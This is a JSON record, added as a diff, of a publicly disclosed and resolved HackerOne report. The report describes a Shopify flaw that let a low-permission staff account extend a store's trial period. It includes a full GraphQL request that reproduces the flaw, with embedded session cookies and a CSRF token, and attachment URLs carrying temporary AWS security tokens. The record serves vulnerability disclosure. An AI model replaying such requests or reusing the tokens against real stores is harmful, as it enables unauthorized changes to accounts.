@@ -1,0 +1,147 @@
+{
+  "id": 947728,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDc3Mjg=",
+  "url": "https://hackerone.com/reports/947728",
+  "title": "staff can able to extend shopify trial period without admin permission",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-30T09:53:49.689Z",
+  "submitted_at": "2020-07-30T09:53:49.689Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "risinghunter",
+    "url": "/risinghunter",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/AkYTJ6rvdsgHeLkwnzzxmsV5/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-15T02:15:16.291Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-15T02:15:16.084Z",
+  "team_member_agreed_on_going_public_at": "2020-09-14T18:59:43.001Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description: my store 14 days trial subscription remains only for 2 days and I see  Shopify also offers shop admin to extend shop trial period to another 14 days. so, I found an issue in which staff with no permission also able to extend trial period without admin permission\n\nsteps to reproduce :\n--\n1). add staff only \"report\" permission\n{F930056}\n2). then added staff isn't able to do any activity related to subscription/plan\n{F930054}\n3). run following TrialSelfExtend Graphql request through added staff account \n███████\n\n```\nPOST /admin/internal/web/graphql/core HTTP/1.1\nHost: risinghunter.myshopify.com\nConnection: close\nContent-Length: 218\naccept: application/json\nX-CSRF-Token: H9hN7Wt7-0Q1PwBhOsOIZMpEcCnp0WZQw8BM\ncontent-type: application/json\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Shopify-Web-Force-Proxy: 1\nOrigin: https://risinghunter.myshopify.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7\nCookie: new_admin=1; new_theme_editor_disabled.sig=c0lGzzh0MFBQ5fCQTfz7yqvtriw; new_theme_editor_disabled=1; _abv=0; _master_udr=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaWxpT1dWbU4yWmtOQzFsTVdFMUxUUmlOekV0WWprMVppMW1PV1ExTm1Jd00yRXhZMllHT2daRlJnPT0iLCJleHAiOiIyMDIyLTA3LTI4VDA3OjEwOjAyLjAyOFoiLCJwdXIiOiJjb29raWUuX21hc3Rlcl91ZHIifX0%3D--aaa21a6f8ca759e8780b581506af5e6b544b851d; _secure_admin_session_id_csrf=9b14248b770db62cc190e3e264362b12; _secure_admin_session_id=9b14248b770db62cc190e3e264362b12; koa.sid=vOD0te0oCONZnKFY8VZeCFGM5sWIbwYB; koa.sid.sig=-qd5DD-YfKDTMZz7LHyxOu7MMsE; _orig_referrer=; _shopify_y=be3905ce-c786-4135-a98c-f4c292fed5bf; _y=be3905ce-c786-4135-a98c-f4c292fed5bf; _landing_page=%2Fadmin%2Fauth%2Flogin%3Faccountnumber%3D0%26from_signup%3Dtrue; __ssid=831ecb8b-307e-4640-af0a-80bfa7b89894; _y=be3905ce-c786-4135-a98c-f4c292fed5bf; _shopify_y=be3905ce-c786-4135-a98c-f4c292fed5bf; _shopify_fs=2020-07-17T04%3A36%3A57.584Z; cart_ver=%3A0; secure_customer_sig=; cart_sig=; new_theme_editor_disabled=1; _ga=GA1.2.1368468577.1594960719; _abv=0; _ab=1; storefront_digest=██████████; _secure_session_id=05214efc7671b79b95c5540b7cde58c2; __cfduid=dd29f3357820fab55e8a97634eec973941595927106\n\n{\"operationName\":\"TrialSelfExtend\",\"variables\":{},\"query\":\"mutation TrialSelfExtend {\\n  trialSelfExtend {\\n    message\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n4). after running above request you get the response \"14 days extension added to your trial period\"\n{F930055}\n\n## Impact\n\nstaff can able to extend Shopify trial period without admin permission",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 930054,
+      "file_name": "subscription.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vEuzKtzSz9HgDSkgQ1e2B5nZ?response-content-disposition=attachment%3B%20filename%3D%22subscription.png%22%3B%20filename%2A%3DUTF-8%27%27subscription.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000353Z&X-Amz-Expires=1081&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=257c3c659346b7ab55e24e62ede9d765debe6ce9c0c9735aa6ea0f290670ef13",
+      "file_size": 18386,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 930055,
+      "file_name": "trial.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yobJiKkJeCEp76rN7KSt8cXv?response-content-disposition=attachment%3B%20filename%3D%22trial.png%22%3B%20filename%2A%3DUTF-8%27%27trial.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000353Z&X-Amz-Expires=1081&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=81877a80b6fd1854e64c35bcba0a583475b1535d36b57080763ca813629e2d2b",
+      "file_size": 45045,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 930056,
+      "file_name": "permission.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TCovpsj8rcG8HFGAJBMhrA3Y?response-content-disposition=attachment%3B%20filename%3D%22permission.png%22%3B%20filename%2A%3DUTF-8%27%27permission.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000353Z&X-Amz-Expires=1081&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed0a11caf7b2f4b2b16a78175b36b499fecd72dbce11ec8ba1e50547997d010a",
+      "file_size": 130274,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 56,
+  "voters": [
+    "401unauth",
+    "drsniper",
+    "mattberg",
+    "ali",
+    "urushya",
+    "salahhasoneh",
+    "pr0f0x01",
+    "hustlebunny",
+    "rac_fckscty",
+    "risinghunter",
+    "and 46 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 413,
+    "asset_type": "URL",
+    "asset_identifier": "your-store.myshopify.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
